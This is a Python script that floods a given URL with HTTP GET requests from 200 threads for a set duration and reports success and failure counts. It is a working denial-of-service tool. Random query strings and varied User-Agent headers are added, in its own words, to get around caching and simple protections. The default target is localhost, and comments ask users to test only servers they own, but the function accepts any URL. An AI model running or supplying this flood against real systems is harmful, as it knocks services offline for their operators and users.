import threading
import http.client
import urllib.parse
import time
import random

def high_intensity_dos(url, thread_count=200, attack_duration=60):
    """
    Attempts to send a very high number of HTTP requests to the target URL.
    Unlike the original, uses raw HTTP requests and random aspects to avoid some simple protections.
    Note: Nearly all large, real-world sites have protections against this kind of script.
    """
    stop_event = threading.Event()
    # Use a lock to avoid race conditions during count increments
    count_lock = threading.Lock()
    success_count = [0]
    fail_count = [0]

    url_parts = urllib.parse.urlparse(url)
    # Fix scheme/conn_scheme logic: HTTPS should use HTTPSConnection, HTTP should use HTTPConnection
    if url_parts.scheme == 'https':
        conn_scheme = http.client.HTTPSConnection
        port = url_parts.port if url_parts.port else 443
    else:
        conn_scheme = http.client.HTTPConnection
        port = url_parts.port if url_parts.port else 80

    def attack():
        while not stop_event.is_set():
            try:
                # Randomize path/query to disrupt basic caching/shielding
                path = url_parts.path if url_parts.path else '/'
                if url_parts.query:
                    path += '?' + url_parts.query
                rand_path = f"{path}?nocache={random.randint(1,9999999)}"
                conn = conn_scheme(url_parts.hostname, port, timeout=3)
                headers = {
                    "User-Agent": f"DoS-Test/{random.randint(1,1000)}",
                    "Cache-Control": "no-cache",
                    "Accept": "*/*",
                    "Connection": "close"
                }
                conn.request("GET", rand_path, headers=headers)
                response = conn.getresponse()
                # Print status for debug (optional):
                # print(f"Thread {threading.current_thread().name} got status {response.status}")
                if 200 <= response.status < 400:
                    with count_lock:
                        success_count[0] += 1
                else:
                    with count_lock:
                        fail_count[0] += 1
            except Exception as e:
                with count_lock:
                    fail_count[0] += 1
                # Uncomment to debug errors:
                # print(f"Exception in thread {threading.current_thread().name}: {e}")
            finally:
                try:
                    conn.close()
                except Exception:
                    pass

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)

    print(
        f"[INFO] High intensity DoS attack simulation on {url}\n"
        f"Threads: {thread_count} | Duration: {attack_duration}s"
    )

    start_time = time.time()
    try:
        while time.time() - start_time < attack_duration:
            time.sleep(5)
            elapsed = int(time.time() - start_time)
            # Use local vars to print consistent values per tick
            with count_lock:
                succ = success_count[0]
                fail = fail_count[0]
            print(
                f"Time elapsed: {elapsed}s | "
                f"Success: {succ} | Failures: {fail}"
            )
    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user.")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=1)

    print(
        "\n[RESULT] Attack finished.\n"
        f"Total Successful Requests: {success_count[0]} | Failed Requests: {fail_count[0]}"
    )
    print(
        "[NOTE] If the real server is a commercial/production one, "
        "it likely has strong anti-DoS protections in place.\n"
        "Real outages should only be tested on your own permissioned environment."
    )

if __name__ == "__main__":
    # WARNING: Only target test servers *you own* and have explicit permission to test.
    # For actual failure demonstration, use your local demo server.
    # Sample localhost target for safe/controlled testing:
    target_url = "http://127.0.0.1:8000/"  # Make sure you have a local server running on this port!
    high_intensity_dos(target_url, thread_count=200, attack_duration=60)
